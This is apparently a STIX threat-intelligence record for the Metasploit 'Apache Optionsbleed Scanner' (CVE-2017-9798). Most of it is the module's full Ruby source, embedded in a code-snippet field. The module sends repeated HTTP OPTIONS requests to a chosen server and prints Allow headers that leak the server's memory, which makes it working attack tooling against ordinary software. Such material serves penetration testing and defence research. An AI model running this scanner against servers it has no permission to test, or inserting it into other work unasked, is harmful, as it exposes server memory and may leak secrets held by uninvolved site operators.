{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4de3a791-3e42-4512-b28f-a61757e97bc5",
    "created": "2024-08-14T16:30:24.545864Z",
    "modified": "2024-08-14T16:30:24.545868Z",
    "name": "Apache Optionsbleed Scanner",
    "description": " This module scans for the Apache optionsbleed vulnerability where the Allow response header returned from an OPTIONS request may bleed memory if the server has a .htaccess file with an invalid Limit method defined. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/apache_optionsbleed.rb",
            "external_id": "apache_optionsbleed.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-9798"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/hannob/optionsbleed"
        },
        {
            "source_name": "reference",
            "url": "https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Apache Optionsbleed Scanner',\n      'Description' => %q{\n        This module scans for the Apache optionsbleed vulnerability where the Allow\n        response header returned from an OPTIONS request may bleed memory if the\n        server has a .htaccess file with an invalid Limit method defined.\n      },\n      'Author' => [\n        'Hanno B\u00f6ck', # Vulnerability discovery\n        'h00die', # Metasploit module\n      ],\n      'References' => [\n        [ 'CVE', '2017-9798' ],\n        [ 'EDB', '42745' ],\n        [ 'URL', 'https://github.com/hannob/optionsbleed' ],\n        [ 'URL', 'https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html' ]\n      ],\n      'DisclosureDate' => '2017-09-18',\n      'License' => MSF_LICENSE,\n      'Notes' =>\n          {\n              'AKA' => ['Optionsbleed']\n          }\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The URI to the folder with the vulnerable .htaccess file', '/']),\n      OptInt.new('REPEAT', [true, 'Times to attempt', 40]),\n      OptBool.new('BUGS', [true, 'Print if any other Allow header bugs are found', true])\n    ])\n  end\n\n  def get_allow_header(ip)\n    res = send_request_raw({\n      'version' => '1.1',\n      'method'  => 'OPTIONS',\n      'uri'     => datastore['TARGETURI']\n    }, 10)\n\n    fail_with(Failure::Unreachable, \"#{peer} - Failed to respond\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - No Allow header identified\") unless res.headers['Allow']\n    res.headers['Allow']\n  end\n\n  def run_host(ip)\n    # Apache bug 61207 regex\n    bug_61207 = /^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$/\n    # Launchpad bug 1717682 regex\n    bug_1717682 = /^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$/\n    uniques = []\n    already_reported = false\n\n    for counter in 1..datastore['REPEAT']\n      allows = get_allow_header(ip)\n      next if uniques.include?(allows) # no need to re-process non-new items\n      uniques << allows\n      if allows =~ bug_61207\n        if allows.split(',').length > allows.split(',').uniq.length # check for repeat items\n          print_status('Some methods were sent multiple times in the list. ' +\n                       'This is a bug, but harmless. It may be Apache bug #61207.') if datastore['BUGS']\n        else\n          vprint_status(\"Request #{counter}: [Standard Response] -> #{allows}\")\n        end\n      elsif allows =~ bug_1717682 && datastore['BUGS']\n        print_status('The list of methods was space-separated instead of comma-separated. ' +\n                     'This is a bug, but harmless. It may be Launchpad bug #1717682.')\n      else\n        print_good(\"Request #{counter}: [OptionsBleed Response] -> #{allows}\")\n      end\n      next unless already_reported\n        report_vuln(\n          :host => ip,\n          :port => rport,\n          :name => self.name,\n          :refs => self.references\n        )\n        already_reported = true\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-09-18"
}